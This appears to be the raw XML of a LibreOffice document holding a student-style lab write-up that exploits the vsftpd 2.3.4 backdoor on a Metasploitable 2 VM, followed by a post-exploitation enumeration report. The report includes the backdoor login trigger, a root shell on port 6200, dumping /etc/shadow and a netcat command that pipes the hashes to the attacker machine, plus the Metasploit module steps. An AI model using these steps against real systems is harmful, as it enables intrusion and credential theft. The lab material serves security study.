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2000001363F7C7BF9.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000010000029000000254563EA3A0.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000010000021D000002123168830C.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000002C9000000EEE42B8F38.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000100000349000002C41B547488.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000100000160000001356EE9CCEE.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000002BC0000015C61475CB6.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000010000033E000000F666858A7A.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000002FD0000011AA85E3FB3.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000001A10000011055530115.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000004BC000002B42821EC12.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000002DA0000005C5AD83827.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000010000034D0000028A96525AE3.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000003E7000001829ACFD375.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000100000349000002C445E1E8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8493in" table:align="left"/>
    </style:style>
    <style:style style:name="Table1.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.4174in"/>
    </style:style>
    <style:style style:name="Table1.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.431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65104" officeooo:paragraph-rsid="00065104"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:writing-mode="lr-tb" style:writing-mode-automatic="false"/>
      <style:text-properties officeooo:rsid="00065104" officeooo:paragraph-rsid="00065104"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:writing-mode="lr-tb" style:writing-mode-automatic="false"/>
      <style:text-properties officeooo:rsid="0006f757" officeooo:paragraph-rsid="0006f757"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:writing-mode="lr-tb" style:writing-mode-automatic="false"/>
      <style:text-properties officeooo:rsid="0007d01c" officeooo:paragraph-rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:paragraph-properties style:writing-mode="lr-tb" style:writing-mode-automatic="false"/>
      <style:text-properties officeooo:rsid="0007d01c" officeooo:paragraph-rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties officeooo:rsid="0007d01c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rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties officeooo:rsid="0007d01c"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="000898b5" officeooo:paragraph-rsid="000898b5"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="000898b5" officeooo:paragraph-rsid="000898b5"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0009dffe" officeooo:paragraph-rsid="0009df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FTPd 2.3.4 exploitation writeup :</text:p>
      <text:p text:style-name="P1">1) first <text:s/>find host (my kali ) machine address</text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:width="6.9252in" svg:height="2.052in" draw:z-index="0"><draw:image xlink:href="Pictures/100000010000033E000000F666858A7A.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P1">My machine ip = 192.168.1.21</text:p>
      <text:p text:style-name="P1">now scann whole subnet:</text:p>
      <text:p text:style-name="P1">2)nmap 192.168.1.21/24</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Image2" text:anchor-type="char" svg:width="6.9252in" svg:height="0.872in" draw:z-index="1"><draw:image xlink:href="Pictures/10000001000002DA0000005C5AD83827.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame>I find a ip runnig in virtual box:</text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr2" draw:name="Image3" text:anchor-type="char" svg:width="5.6354in" svg:height="5.5209in" draw:z-index="2"><draw:image xlink:href="Pictures/100000010000021D000002123168830C.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:soft-page-break/><text:s text:c="2"/></text:p>
      <text:p text:style-name="P1">target ip =192.168.1.45</text:p>
      <text:p text:style-name="P1">Again confirm target port 21 is running on what is service</text:p>
      <text:p text:style-name="P2">nmap -sV -p21 192.168.1.45</text:p>
      <text:p text:style-name="P2"><draw:frame draw:style-name="fr1" draw:name="Image4" text:anchor-type="char" svg:width="6.9252in" svg:height="2.552in" draw:z-index="3"><draw:image xlink:href="Pictures/10000001000002FD0000011AA85E3FB3.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Connect to port 21 of target :</text:p>
      <text:p text:style-name="P3">nc 192.168.1.45 21</text:p>
      <text:p text:style-name="P3">then enter these</text:p>
      <text:p text:style-name="P3">USER backdoored:)</text:p>
      <text:p text:style-name="P3">PASS anypassword123</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="Image5" text:anchor-type="char" svg:width="3.6665in" svg:height="3.2189in" draw:z-index="4"><draw:image xlink:href="Pictures/1000000100000160000001356EE9CCEE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nnect back with backdoor on 6200 port of target imediately ,</text:p>
      <text:p text:style-name="P3">open other terminal and run this command :</text:p>
      <text:p text:style-name="P3">nc 192.168.1.45 6200 ,</text:p>
      <text:p text:style-name="P3">run command to know what is we gain</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="Image6" text:anchor-type="char" svg:width="6.9252in" svg:height="3.4425in" draw:z-index="5"><draw:image xlink:href="Pictures/10000001000002BC0000015C61475CB6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:soft-page-break/><text:s text:c="2"/></text:p>
      <text:p text:style-name="P3">upgrade the dumb shell to interactive tty</text:p>
      <text:p text:style-name="P3">run</text:p>
      <text:p text:style-name="P3">python -c ‘import pty; pty.spawn(“/bin/bash”)’</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="Image7" text:anchor-type="char" svg:width="4.3437in" svg:height="2.8335in" draw:z-index="6"><draw:image xlink:href="Pictures/10000001000001A10000011055530115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ystem reconnaissance what we found :</text:p>
      <text:h text:style-name="P5" text:outline-level="1">Post-Exploitation Enumeration Report</text:h>
      <text:p text:style-name="P6">Target Machine: Metasploitable 2<text:line-break/>Attacker Machine: Kali Linux<text:line-break/>Objective: Basic Linux post-exploitation enumeration and privilege verification.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1"><text:soft-page-break/>1. Connect to Reverse Shell</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">nc 192.168.1.45 6200</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Connected to the target machine through a Netcat reverse shell listener running on port <text:span text:style-name="Source_20_Text">6200</text:span>.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">2. Upgrade Shell to Interactive TTY</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">python -c 'import pty; pty.spawn("/bin/bash")'</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Spawned a fully interactive Bash shell using Python PTY for better terminal functionality.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">3. Verify Current User and System Information</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; uname -a</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Displayed current user privileges, UID/GID information, hostname, and Linux kernel details.</text:p>
      <text:h text:style-name="P9" text:outline-level="3">Findings</text:h>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P11">User: <text:span text:style-name="Source_20_Text">root</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Hostname: <text:span text:style-name="Source_20_Text">metasploitable</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Kernel: <text:span text:style-name="Source_20_Text">Linux 2.6.24-16-server</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1"><text:soft-page-break/>4. Enumerate Bash Users</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">cat /etc/passwd | grep "/bin/bash"</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Listed users having Bash shell access on the target system.</text:p>
      <text:h text:style-name="P9" text:outline-level="3">Findings</text:h>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P12">root</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">msfadmin</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">postgres</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">user</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">service</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">5. Search for SUID Files</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">find / -perm 4000 2&gt;/dev/null</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Searched the system for SUID binaries that may allow privilege escalation.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">6. Enumerate Running Processes</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Incorrect Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">pa aux</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Mistyped command resulted in “command not found”.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P9" text:outline-level="3"><text:soft-page-break/>Correct Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">ps aux | head -30</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Displayed the first 30 running processes on the system.</text:p>
      <text:h text:style-name="P9" text:outline-level="3">Findings</text:h>
      <text:p text:style-name="P6">Observed multiple system services and daemon processes running as <text:span text:style-name="Source_20_Text">root</text:span>.</text:p>
      <text:p text:style-name="P6"><draw:frame draw:style-name="fr2" draw:name="Image8" text:anchor-type="char" svg:width="6.8335in" svg:height="6.2083in" draw:z-index="7"><draw:image xlink:href="Pictures/100000010000029000000254563EA3A0.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame></text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1"><text:soft-page-break/>7. Enumerate Listening Ports and Services</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">ss -tulnp</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Displayed all active listening TCP/UDP services with associated processes.</text:p>
      <text:p text:style-name="P6"><draw:frame draw:style-name="fr1" draw:name="Image9" text:anchor-type="char" svg:width="6.9252in" svg:height="3.9535in" draw:z-index="8"><draw:image xlink:href="Pictures/10000001000004BC000002B42821EC12.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Important Open Services Identified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ort</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Service</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows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FTP</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row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SSH</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row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Telnet</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row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SMTP</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">53</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">DNS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">80</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Apache Web Server</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">445</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">SMB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">3306</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">MySQL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">5432</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">PostgreSQL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">5900</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">VNC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">6667</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">UnrealIRCd</text:p>
          </table:table-cell>
        </table:table-row>
        <text:soft-page-break/>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">8180</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Tomcat</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">1524</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Backdoor Shell</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">8. Enumerate Scheduled Cron Jobs</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">cat /etc/crontab &amp;&amp; ls /etc/cron.*</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Enumerated system-wide cron jobs and scheduled maintenance tasks.</text:p>
      <text:p text:style-name="P6"><draw:frame draw:style-name="fr1" draw:name="Image10" text:anchor-type="char" svg:width="6.9252in" svg:height="5.3264in" draw:z-index="9"><draw:image xlink:href="Pictures/100000010000034D0000028A96525AE3.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Findings</text:h>
      <text:p text:style-name="P6">Detected scheduled tasks for:</text:p>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P13"><text:soft-page-break/>Apache</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">Samba</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">PostgreSQL</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">Tomcat</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">ProFTPD</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">Logrotate</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">9. Access Password Hashes</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">cat /etc/shadow</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Displayed password hashes stored in the shadow file because root privileges were available.</text:p>
      <text:p text:style-name="P6"><draw:frame draw:style-name="fr1" draw:name="Image11" text:anchor-type="char" svg:width="6.9252in" svg:height="5.8291in" draw:z-index="10"><draw:image xlink:href="Pictures/1000000100000349000002C41B547488.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:soft-page-break/></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Findings</text:h>
      <text:p text:style-name="P6">Extracted hashes for:</text:p>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P14">root</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">msfadmin</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">postgres</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">user</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">service</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1"><text:soft-page-break/>10. Save Password Hashes to File</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">cat /etc/shadow &gt; /tmp/hashes.txt</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Saved extracted password hashes into a temporary file for later analysis.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">11. Attempt Netcat Listener</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Incorrect Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">nc -lvnpp 5555 &gt; hashes.txt</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Incorrect Netcat syntax caused an invalid port error.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">12. Attempt Hash Transfer</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">cat /tmp/hashes.txt | nc 192.168.1.21 5555</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3">Explanation</text:h>
      <text:p text:style-name="P6">Attempted to transfer password hashes to attacker machine using Netcat.</text:p>
      <text:h text:style-name="P9" text:outline-level="3">Result</text:h>
      <text:p text:style-name="P6">Connection failed because no listener was active on port <text:span text:style-name="Source_20_Text">5555</text:span>.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P8" text:outline-level="1">13. Check Bash History</text:h>
      <text:h text:style-name="P9" text:outline-level="3">Command</text:h>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text">cat /root/.bash_history</text:span></text:p>
      <text:h text:style-name="P9" text:outline-level="3"><text:soft-page-break/>Explanation</text:h>
      <text:p text:style-name="P6">Attempted to view root user's Bash command history for sensitive information.</text:p>
      <text:h text:style-name="P9" text:outline-level="3">Findings</text:h>
      <text:p text:style-name="P6">No useful command history was found.</text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P15" text:outline-level="1">Repeat Process With Msfconsole:</text:h>
      <text:p text:style-name="P16">Run msfconsole :</text:p>
      <text:p text:style-name="P16">bash → msfconsole</text:p>
      <text:p text:style-name="P16"><draw:frame draw:style-name="fr1" draw:name="Image12" text:anchor-type="char" svg:width="6.9252in" svg:height="5.8291in" draw:z-index="11"><draw:image xlink:href="Pictures/1000000100000349000002C445E1E8CC.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s text:c="3"/></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"><text:soft-page-break/>find module</text:p>
      <text:p text:style-name="P16">msf6 &gt; search vsftpd</text:p>
      <text:p text:style-name="P16">load exploitation</text:p>
      <text:p text:style-name="P16">msf6 &gt; use 1</text:p>
      <text:p text:style-name="P16"><draw:frame draw:style-name="fr1" draw:name="Image13" text:anchor-type="char" svg:width="6.9252in" svg:height="2.6756in" draw:z-index="12"><draw:image xlink:href="Pictures/10000001000003E7000001829ACFD375.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s text:c="2"/></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P17">set target</text:p>
      <text:p text:style-name="Text_20_body">msf exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.1.45</text:p>
      <text:p text:style-name="Text_20_body"><text:s/><draw:frame draw:style-name="fr1" draw:name="Image14" text:anchor-type="char" svg:width="6.9252in" svg:height="2.311in" draw:z-index="13"><draw:image xlink:href="Pictures/10000001000002C9000000EEE42B8F38.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame></text:p>
      <text:p text:style-name="P17">then run</text:p>
      <text:p text:style-name="P17">backdoor trigered and session succesfully created:</text:p>
      <text:p text:style-name="P17"><draw:frame draw:style-name="fr3" draw:name="Image15" text:anchor-type="char" svg:width="6.9252in" svg:height="3.0402in" draw:z-index="14"><draw:image xlink:href="Pictures/10000001000002C2000001363F7C7BF9.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:soft-page-break/><text:s text:c="3"/></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">over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2T21:56:55.207923268</meta:creation-date>
    <dc:date>2026-05-12T22:56:02.425467396</dc:date>
    <meta:editing-duration>PT11M5S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:generator>LibreOffice/26.2.2.2$Linux_X86_64 LibreOffice_project/620$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:image-count="15" meta:object-count="0" meta:page-count="15" meta:paragraph-count="175" meta:word-count="593" meta:character-count="3829" meta:non-whitespace-character-count="3400"/>
  </office:meta>
</office:document-meta>
</file>